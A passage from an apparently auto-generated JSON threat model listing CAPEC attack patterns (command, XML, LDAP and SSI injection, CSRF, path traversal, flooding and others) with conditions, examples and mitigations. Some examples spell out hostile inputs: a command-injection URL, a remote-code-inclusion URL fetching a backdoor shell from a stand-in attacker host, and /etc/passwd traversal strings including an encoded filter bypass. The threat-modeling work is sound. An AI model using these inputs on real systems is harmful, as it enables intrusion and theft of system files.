operations.Implementation: The victim should configure the browser to minimize active content from untrusted sources.", "references": "https://capec.mitre.org/data/definitions/247.html, https://cwe.mitre.org/data/definitions/86.html", "response": "", "severity": "Medium", "target": "Agent Runtime", "threat_id": "INP30"}, {"assumption": null, "condition": "target.controls.usesParameterizedInput is False and (target.controls.validatesInput is False or target.controls.sanitizesInput is False)", "cvss": "", "description": "Command Injection", "details": "An adversary looking to execute a command of their choosing, injects new items into an existing command thus modifying interpretation away from what was intended. Commands in this context are often standalone strings that are interpreted by a downstream component and cause specific responses. This type of attack is possible when untrusted values are used to build these command strings. Weaknesses in input validation or command construction can enable the attack and lead to successful exploitation.", "example": "Consider a URL 'http://sensitive/cgi-bin/userData.pl?doc=user1.txt'. If the URL is modified like so - 'http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|', it executed the command '/bin/ls|'. This is how command injection is implemented.", "id": "164", "mitigations": "All user-controllable input should be validated and filtered for potentially unwanted characters. Whitelisting input is desired, but if a blacklisting approach is necessary, then focusing on command related terms and delimiters is necessary.Input should be encoded prior to use in commands to make sure command related characters are not treated as part of the command. For example, quotation characters may need to be encoded so that the application does not treat the quotation as a delimiter.Input should be parameterized, or restricted to data sections of a command, thus removing the chance that the input will be treated as part of the command itself.", "references": "https://capec.mitre.org/data/definitions/248.html", "response": "", "severity": "High", "target": "Agent Runtime", "threat_id": "INP31"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XML Injection", "details": "An attacker utilizes crafted XML user-controllable input to probe, attack, and inject data into the XML database, using techniques similar to SQL injection. The user-controllable input can allow for unauthorized viewing of data, bypassing authentication or the front-end application for direct XML database access, and possibly altering database information.", "example": "Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.", "id": "165", "mitigations": "Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XML data or a query. Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.", "references": "https://capec.mitre.org/data/definitions/250.html", "response": "", "severity": "High", "target": "Agent Runtime", "threat_id": "INP32"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Remote Code Inclusion", "details": "The attacker forces an application to load arbitrary code files from a remote location. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load malicious files that the attacker placed on the remote machine, or to otherwise change the functionality of the targeted application in unexpected ways.", "example": "URL string http://www.example.com/vuln_page.php?file=http://www.hacker.com/backdoor_ contains an external reference to a backdoor code file stored in a remote location (http://www.hacker.com/backdoor_shell.php.) Having been uploaded to the application, this backdoor can later be used to hijack the underlying server or gain access to the application database.", "id": "166", "mitigations": "Minimize attacks by input validation and sanitization of any user data that will be used by the target application to locate a remote file to be included.", "references": "https://capec.mitre.org/data/definitions/253.html", "response": "", "severity": "High", "target": "Agent Runtime", "threat_id": "INP33"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Leverage Alternate Encoding", "details": "An adversary leverages the possibility to encode potentially harmful input or content used by applications such that the applications are ineffective at validating this encoding standard.", "example": "Microsoft Internet Explorer 5.01 SP4, 6, 6 SP1, and 7 does not properly handle unspecified encoding strings, which allows remote attackers to bypass the Same Origin Policy and obtain sensitive information via a crafted web site, aka Post Encoding Information Disclosure Vulnerability. Related Vulnerabilities CVE-2010-0488Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.", "id": "167", "mitigations": "Assume all input might use an improper representation. Use canonicalized data inside the application; all data must be converted into the representation used inside the application (UTF-8, UTF-16, etc.)Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.", "references": "https://capec.mitre.org/data/definitions/267.html", "response": "", "severity": "High", "target": "Agent Runtime", "threat_id": "INP35"}, {"assumption": null, "condition": "target.controls.implementsPOLP is False", "cvss": "", "description": "Schema Poisoning", "details": "An adversary corrupts or modifies the content of a schema for the purpose of undermining the security of the target. Schemas provide the structure and content definitions for resources used by an application. By replacing or modifying a schema, the adversary can affect how the application handles or interprets a resource, often leading to possible denial of service, entering into an unexpected state, or recording incomplete data.", "example": "In a JSON Schema Poisoning Attack, an adervary modifies the JSON schema to cause a Denial of Service (DOS) or to submit malicious input: { title: Contact, type: object, properties: { Name: { type: string }, Phone: { type: string }, Email: { type: string }, Address: { type: string } }, required: [Name, Phone, Email, Address] } If the 'name' attribute is required in all submitted documents and this field is removed by the adversary, the application may enter an unexpected state or record incomplete data. Additionally, if this data is needed to perform additional functions, a Denial of Service (DOS) may occur.In a Database Schema Poisoning Attack, an adversary alters the database schema being used to modify the database in some way. This can result in loss of data, DOS, or malicious input being submitted. Assuming there is a column named name, an adversary could make the following schema change: ALTER TABLE Contacts MODIFY Name VARCHAR(65353); The Name field of the Conteacts table now allows the storing of names up to 65353 characters in length. This could allow the adversary to store excess data within the database to consume system resource or to execute a DOS.", "id": "168", "mitigations": "Design: Protect the schema against unauthorized modification.Implementation: For applications that use a known schema, use a local copy or a known good repository instead of the schema reference supplied in the schema document.Implementation: For applications that leverage remote schemas, use the HTTPS protocol to prevent modification of traffic in transit and to avoid unauthorized modification.", "references": "https://capec.mitre.org/data/definitions/271.html", "response": "", "severity": "High", "target": "Agent Runtime", "threat_id": "AC15"}, {"assumption": null, "condition": "(target.controls.usesStrongSessionIdentifiers is False or target.controls.encryptsCookies is False) and target.controls.definesConnectionTimeout is False", "cvss": "", "description": "Session Hijacking - ClientSide", "details": "This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The advarsary is able to steal or manipulate an active session and use it to gain unathorized access to the application.", "example": "Cross Site Injection Attack is a great example of Session Hijacking. Attacker can capture victim\u2019s Session ID using XSS attack by using javascript. If an attacker sends a crafted link to the victim with the malicious JavaScript, when the victim clicks on the link, the JavaScript will run and complete the instructions made by the attacker.", "id": "169", "mitigations": "Properly encrypt and sign identity tokens in transit, and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout, terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated.", "references": "https://capec.mitre.org/data/definitions/593.html", "response": "", "severity": "Very High", "target": "Agent Runtime", "threat_id": "AC18"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Argument Injection", "details": "An attacker changes the behavior or state of a targeted application through injecting data or command syntax through the targets use of non-validated and non-filtered arguments of exposed services or methods.", "example": "A recent example instance of argument injection occurred against Java Web Start technology, which eases the client side deployment for Java programs. The JNLP files that are used to describe the properties for the program. The client side Java runtime used the arguments in the property setting to define execution parameters, but if the attacker appends commands to an otherwise legitimate property file, then these commands are sent to the client command shell. [R.6.2]", "id": "170", "mitigations": "Design: Do not program input values directly on command shell, instead treat user input as guilty until proven innocent. Build a function that takes user input and converts it to applications specific types and values, stripping or filtering out all unauthorized commands and characters in the process.Design: Limit program privileges, so if metacharacters or other methods circumvent program input validation routines and shell access is attained then it is not running under a privileged account. chroot jails create a sandbox for the application to execute in, making it more difficult for an attacker to elevate privilege even in the case that a compromise has occurred.Implementation: Implement an audit log that is written to a separate host, in the event of a compromise the audit log may be able to provide evidence and details of the compromise.", "references": "https://capec.mitre.org/data/definitions/6.html", "response": "", "severity": "High", "target": "Agent Runtime", "threat_id": "INP41"}, {"assumption": null, "condition": "target.controls.definesConnectionTimeout is False and (target.controls.usesMFA is False or target.controls.encryptsSessionData is False)", "cvss": "", "description": "Reusing Session IDs (aka Session Replay) - ClientSide", "details": "This attack targets the reuse of valid session ID to spoof the target system in order to gain privileges. The attacker tries to reuse a stolen session ID used previously during a transaction to perform spoofing and session hijacking. Another name for this type of attack is Session Replay.", "example": "OpenSSL and SSLeay allow remote attackers to reuse SSL sessions and bypass access controls. See also: CVE-1999-0428Merak Mail IceWarp Web Mail uses a static identifier as a user session ID that does not change across sessions, which could allow remote attackers with access to the ID to gain privileges as that user, e.g. by extracting the ID from the user's answer or forward URLs. See also: CVE-2002-0258", "id": "171", "mitigations": "Always invalidate a session ID after the user logout.Setup a session time out for the session IDs.Protect the communication between the client and server. For instance it is best practice to use SSL to mitigate man in the middle attack.Do not code send session ID with GET method, otherwise the session ID will be copied to the URL. In general avoid writing session IDs in the URLs. URLs can get logged in log files, which are vulnerable to an attacker.Encrypt the session data associated with the session ID.Use multifactor authentication.", "references": "https://capec.mitre.org/data/definitions/60.html", "response": "", "severity": "High", "target": "Agent Runtime", "threat_id": "AC20"}, {"assumption": null, "condition": "target.controls.implementsCSRFToken is False or target.controls.verifySessionIdentifiers is False", "cvss": "", "description": "Cross Site Request Forgery", "details": "An attacker crafts malicious web links and distributes them (via web pages, email, etc.), typically in a targeted manner, hoping to induce users to click on the link and execute the malicious action against some third-party application. If successful, the action embedded in the malicious link will be processed and accepted by the targeted application with the users' privilege level. This type of attack leverages the persistence and implicit trust placed in user session cookies by many web applications today. In such an architecture, once the user authenticates to an application and a session cookie is created on the user's system, all following transactions for that session are authenticated using that cookie including potential actions initiated by an attacker and simply riding the existing session cookie.", "example": "While a user is logged into his bank account, an attacker can send an email with some potentially interesting content and require the user to click on a link in the email. The link points to or contains an attacker setup script, probably even within an iFrame, that mimics an actual user form submission to perform a malicious activity, such as transferring funds from the victim's account. The attacker can have the script embedded in, or targeted by, the link perform any arbitrary action as the authenticated user. When this script is executed, the targeted application authenticates and accepts the actions based on the victims existing session cookie.See also: Cross-site request forgery (CSRF) vulnerability in util.pl in @Mail WebMail 4.51 allows remote attackers to modify arbitrary settings and perform unauthorized actions as an arbitrary user, as demonstrated using a settings action in the SRC attribute of an IMG element in an HTML e-mail.", "id": "172", "mitigations": "Use cryptographic tokens to associate a request with a specific action. The token can be regenerated at every request so that if a request with an invalid token is encountered, it can be reliably discarded. The token is considered invalid if it arrived with a request other than the action it was supposed to be associated with.Although less reliable, the use of the optional HTTP Referrer header can also be used to determine whether an incoming request was actually one that the user is authorized for, in the current context.Additionally, the user can also be prompted to confirm an action every time an action concerning potentially sensitive data is invoked. This way, even if the attacker manages to get the user to click on a malicious link and request the desired action, the user has a chance to recover by denying confirmation. This solution is also implicitly tied to using a second factor of authentication before performing such actions.In general, every request must be checked for the appropriate authentication token as well as authorization in the current session context.", "references": "https://capec.mitre.org/data/definitions/62.html", "response": "", "severity": "Very High", "target": "Agent Runtime", "threat_id": "AC21"}, {"assumption": null, "condition": "target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "Server Side Include (SSI) Injection", "details": "An attacker can use Server Side Include (SSI) Injection to send code to a web application that then gets executed by the web server. Doing so enables the attacker to achieve similar results to Cross Site Scripting, viz., arbitrary code execution and information disclosure, albeit on a more limited scale, since the SSI directives are nowhere near as powerful as a full-fledged scripting language. Nonetheless, the attacker can conveniently gain access to sensitive files, such as password files, and execute shell commands.", "example": "Consider a website hosted on a server that permits Server Side Includes (SSI), such as Apache with the Options Includes directive enabled. Whenever an error occurs, the HTTP Headers along with the entire request are logged, which can then be displayed on a page that allows review of such errors. A malicious user can inject SSI directives in the HTTP Headers of a request designed to create an error. When these logs are eventually reviewed, the server parses the SSI directives and executes them.", "id": "173", "mitigations": "Set the OPTIONS IncludesNOEXEC in the global access.conf file or local .htaccess (Apache) file to deny SSI execution in directories that do not need them. All user controllable input must be appropriately sanitized before use in the application. This includes omitting, or encoding, certain characters or strings that have the potential of being interpreted as part of an SSI directive. Server Side Includes must be enabled only if there is a strong business reason to do so. Every additional component enabled on the web server increases the attack surface as well as administrative overhead.", "references": "https://capec.mitre.org/data/definitions/101.html, http://cwe.mitre.org/data/definitions/97.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/713.html", "response": "", "severity": "High", "target": "Browser Control Server", "threat_id": "INP03"}, {"assumption": null, "condition": "target.controls.validatesInput is False", "cvss": "", "description": "Command Line Execution through SQL Injection", "details": "An attacker uses standard SQL injection methods to inject data into the command line for execution. This could be done directly through misuse of directives such as MSSQL_xp_cmdshell or indirectly through injection of data into the database that would be interpreted as shell commands. Sometime later, an unscrupulous backend application (or could be part of the functionality of the same application) fetches the injected data stored in the database and uses this data as command line arguments without performing proper validation. The malicious data escapes that data plane by spawning new commands to be executed on the host.", "example": "SQL injection vulnerability in Cacti 0.8.6i and earlier, when register_argc_argv is enabled, allows remote attackers to execute arbitrary SQL commands via the (1) second or (2) third arguments to cmd.php. NOTE: this issue can be leveraged to execute arbitrary commands since the SQL query results are later used in the polling_items array and popen function", "id": "174", "mitigations": "Disable MSSQL xp_cmdshell directive on the databaseProperly validate the data (syntactically and semantically) before writing it to the database. Do not implicitly trust the data stored in the database. Re-validate it prior to usage to make sure that it is safe to use in a given context (e.g. as a command line argument).", "references": "https://capec.mitre.org/data/definitions/108.html, http://cwe.mitre.org/data/definitions/89.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/78.html, http://cwe.mitre.org/data/definitions/114.html", "response": "", "severity": "Very High", "target": "Browser Control Server", "threat_id": "INP05"}, {"assumption": null, "condition": "target.controls.authenticatesSource is False", "cvss": "", "description": "Authentication Abuse/ByPass", "details": "An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme's implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker. This attack may exploit assumptions made by the target's authentication procedures, such as assumptions regarding trust relationships or assumptions regarding the generation of secret values. This attack differs from Authentication Bypass attacks in that Authentication Abuse allows the attacker to be certified as a valid user through illegitimate means, while Authentication Bypass allows the user to access protected material without ever being certified as an authenticated user. This attack does not rely on prior sessions established by successfully authenticating users, as relied upon for the Exploitation of Session Variables, Resource IDs and other Trusted Credentials attack patterns.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "175", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/114.html, http://cwe.mitre.org/data/definitions/287.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "AA01"}, {"assumption": null, "condition": "(target.controls.sanitizesInput is False or target.controls.validatesInput is False) or target.controls.encodesOutput is False", "cvss": "", "description": "Excavation", "details": "An adversary actively probes the target in a manner that is designed to solicit information that could be leveraged for malicious purposes. This is achieved by exploring the target via ordinary interactions for the purpose of gathering intelligence about the target, or by sending data that is syntactically invalid or non-standard in an attempt to produce a response that contains the desired data. As a result of these interactions, the adversary is able to obtain information from the target that aids the attacker in making inferences about its security, configuration, or potential vulnerabilities. Examplar exchanges with the target may trigger unhandled exceptions or verbose error messages that reveal information like stack traces, configuration information, path information, or database design. This type of attack also includes the manipulation of query strings in a URI to produce invalid SQL queries, or by trying alternative path values in the hope that the server will return useful information.", "example": "The adversary may collect this information through a variety of methods including active querying as well as passive observation. By exploiting weaknesses in the design or configuration of the target and its communications, an adversary is able to get the target to reveal more information than intended. Information retrieved may aid the adversary in making inferences about potential weaknesses, vulnerabilities, or techniques that assist the adversary's objectives. This information may include details regarding the configuration or capabilities of the target, clues as to the timing or nature of activities, or otherwise sensitive information. Often this sort of attack is undertaken in preparation for some other type of attack, although the collection of information by itself may in some cases be the end goal of the adversary.", "id": "176", "mitigations": "Minimize error/response output to only what is necessary for functional use or corrective language. Remove potentially sensitive information that is not necessary for the application's functionality.", "references": "https://capec.mitre.org/data/definitions/116.html, http://cwe.mitre.org/data/definitions/200.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "DS01"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Double Encoding", "details": "The adversary utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. This may allow the adversary to bypass filters that attempt to detect illegal characters or strings, such as those that might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings, but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.", "example": "Double Enconding Attacks can often be used to bypass Cross Site Scripting (XSS) detection and execute XSS attacks. The use of double encouding prevents the filter from working as intended and allows the XSS to bypass dectection. This can allow an adversary to execute malicious code.", "id": "177", "mitigations": "Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input. Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible. Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.Refer to the RFCs to safely decode URL. Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive. There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).", "references": "https://capec.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/173.html, http://cwe.mitre.org/data/definitions/177.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "DE02"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.authorizesSource is False", "cvss": "", "description": "Privilege Abuse", "details": "An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "178", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/122.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/269.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "AC01"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False or target.controls.isResilient is False", "cvss": "", "description": "Flooding", "details": "An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.", "example": "Adversary tries to bring a network or service down by flooding it with large amounts of traffic.", "id": "179", "mitigations": "Ensure that protocols have specific limits of scale configured. Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits. Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed.", "references": "https://capec.mitre.org/data/definitions/125.html, http://cwe.mitre.org/data/definitions/404.html, http://cwe.mitre.org/data/definitions/770.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "DO01"}, {"assumption": null, "condition": "target.controls.validatesInput is False and target.controls.sanitizesInput is False", "cvss": "", "description": "Path Traversal", "details": "An adversary uses path manipulation methods to exploit insufficient input validation of a target to obtain access to data that should be not be retrievable by ordinary well-formed requests. A typical variety of this attack involves specifying a path to a desired file together with dot-dot-slash characters, resulting in the file access API or function traversing out of the intended directory structure and into the root file system. By replacing or modifying the expected path information the access function or API retrieves the file desired by the attacker. These attacks either involve the attacker providing a complete path to a targeted file or using control characters (e.g. path separators (/ or ) and/or dots (.)) to reach desired directories or files.", "example": "An example of using path traversal to attack some set of resources on a web server is to use a standard HTTP request http://example/../../../../../etc/passwd From an attacker point of view, this may be sufficient to gain access to the password file on a poorly protected system. If the attacker can list directories of critical resources then read only access is not sufficient to protect the system.", "id": "180", "mitigations": "Design: Configure the access control correctly. Design: Enforce principle of least privilege. Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution. Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement. Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host. 6. Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands. Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin. Implementation: Perform input validation for all remote content, including remote and user-generated content. Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables. Implementation: Use indirect references rather than actual file names. Implementation: Use possible permissions on file access when developing and deploying web applications. Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach.", "references": "https://capec.mitre.org/data/definitions/126.html, http://cwe.mitre.org/data/definitions/22.html", "response": "", "severity": "Very High", "target": "Browser Control Server", "threat_id": "HA01"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False", "cvss": "", "description": "Excessive Allocation", "details": "An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.", "example": "In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.", "id": "181", "mitigations": "Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.", "references": "https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "DO02"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Format String Injection", "details": "An adversary includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An adversary can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the adversary can write to the program stack.", "example": "Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a ../po directory, which can be leveraged to conduct format string attacks.", "id": "182", "mitigations": "Limit the usage of formatting string functions. Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters.", "references": "https://capec.mitre.org/data/definitions/135.html, http://cwe.mitre.org/data/definitions/134.html, http://cwe.mitre.org/data/definitions/133.html", "response": "", "severity": "High", "target": "Browser Control Server", "threat_id": "INP08"}, {"assumption": null, "condition": "target.controls.validatesInput is False", "cvss": "", "description": "LDAP Injection", "details": "An attacker manipulates or crafts an LDAP query for the purpose of undermining the security of the target. Some applications use user input to create LDAP queries that are processed by an LDAP server. For example, a user might provide their username during authentication and the username might be inserted in an LDAP query during the authentication process. An attacker could use this input to inject additional commands into an LDAP query that could disclose sensitive information. For example, entering a * in the aforementioned query might return information about all users on the system. This attack is very similar to an SQL injection attack in that it manipulates a query to gather additional information or coerce a particular return value.", "example": "PowerDNS before 2.9.18, when running with an LDAP backend, does not properly escape LDAP queries, which allows remote attackers to cause a denial of service (failure to answer ldap questions) and possibly conduct an LDAP injection attack.", "id": "183", "mitigations": "Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as LDAP content. Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the LDAP or application.", "references": "https://capec.mitre.org/data/definitions/136.html, http://cwe.mitre.org/data/definitions/77.html, http://cwe.mitre.org/data/definitions/90.html, http://cwe.mitre.org/data/definitions/20.html", "response": "", "severity": "High", "target": "Browser Control Server", "threat_id": "INP09"}, {"assumption": null, "condition": "target.controls.validatesInput is False", "cvss": "", "description": "Parameter Injection", "details": "An adversary manipulates the content of request parameters for the purpose of undermining the security of the target. Some parameter encodings use text characters as separators. For example, parameters in a HTTP GET message are encoded as name-value pairs separated by an ampersand (&). If an attacker can supply text strings that are used to fill in these parameters, then they can inject special characters used in the encoding scheme to add or modify parameters. For example, if user input is fed directly into an HTTP GET request and the user provides the value myInput&new_param=myValue, then the input parameter is set to myInput, but a new parameter (new_param) is also added with a value of myValue. This can significantly change the meaning of the query that is processed by the server. Any encoding scheme where parameters are identified and separated by text characters is potentially vulnerable to this attack - the HTTP GET encoding used above is just one example.", "example": "The target application accepts a string as user input, fails to sanitize characters that have a special meaning in the parameter encoding, and inserts the user-supplied string in an encoding which is then processed.", "id": "184", "mitigations": "Implement an audit log written to a separate host. In the event of a compromise, the audit log may be able to provide evidence and details of the compromise. Treat all user input as untrusted data that must be validated before use.", "references": "https://capec.mitre.org/data/definitions/137.html, http://cwe.mitre.org/data/definitions/88.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "INP10"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Relative Path Traversal", "details": "An attacker exploits a weakness in input validation on the target by supplying a specially constructed path utilizing dot and slash characters for the purpose of obtaining access to arbitrary files or resources. An attacker modifies a known path on the target in order to reach material that is not available through intended channels. These attacks normally involve adding additional path separators (/ or ) and/or dots (.), or encodings thereof, in various combinations in order to reach parent directories or entirely separate trees of the target's directory structure.", "example": "The attacker uses relative path traversal to access files in the application. This is an example of accessing user's password file. http://www.example.com/getProfile.jsp?filename=../../../../etc/passwd However, the target application employs regular expressions to make sure no relative path sequences are being passed through the application to the web page. The application would replace all matches from this regex with the empty string. Then an attacker creates special payloads to bypass this filter: http://www.example.com/getProfile.jsp?filename=%2e%2e/%2e%2e/%2e%2e/%2e%2e /etc/passwd When the application gets this input string, it will be the desired vector by the attacker.", "id": "185", "mitigations": "Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement. Implementation: Perform input validation for all remote content, including remote and user-generated content. Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach. Implementation: Prefer working without user input when using file system calls. Implementation: Use indirect references rather than actual file names. Implementation: Use possible permissions on file access when developing and deploying web applications.", "references": "https://capec.mitre.org/data/definitions/139.html, http://cwe.mitre.org/data/definitions/23.html", "response": "", "severity": "High", "target": "Browser Control Server", "threat_id": "INP11"}, {"assumption": null, "condition": "target.controls.validatesInput is False", "cvss": "", "description": "Input Data Manipulation", "details": "An attacker exploits a weakness in input validation by controlling the format, structure, and composition of data to an input-processing interface. By supplying input of a non-standard or unexpected form an attacker can adversely impact the security of the target. For example, using a different character encoding might cause dangerous text to be treated as safe text. Alternatively, the attacker may use certain flags, such as file extensions, to make a target application believe that provided data should be handled using a certain interpreter when the data is not actually of the appropriate type. This can lead to bypassing protection mechanisms, forcing the target to use specific components for input processing, or otherwise causing the user's data to be handled differently than might otherwise be expected. This attack differs from Variable Manipulation in that Variable Manipulation attempts to subvert the target's processing through the value of the input while Input Data Manipulation seeks to control how the input is processed.", "example": "A target application has an integer variable for which only some integer values are expected by the application. But since it does not have any checks in place to validate the value of the input, the attacker is able to manipulate the targeted integer variable such that normal operations result in non-standard values.", "id": "186", "mitigations": "Validation of user input for type, length, data-range, format, etc.", "references": "https://capec.mitre.org/data/definitions/153.html, http://cwe.mitre.org/data/definitions/20.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "INP14"}, {"assumption": null, "condition": "target.controls.implementsAuthenticationScheme is False", "cvss": "", "description": "Dictionary-based Password Attack", "details": "An attacker tries each of the words in a dictionary as passwords to gain access to the system via some user's account. If the password chosen by the user was a word within the dictionary, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern.", "example": "A system user selects the word treacherous as their passwords believing that it would be very difficult to guess. The password-based dictionary attack is used to crack this password and gain access to the account.The Cisco LEAP challenge/response authentication mechanism uses passwords in a way that is susceptible to dictionary attacks, which makes it easier for remote 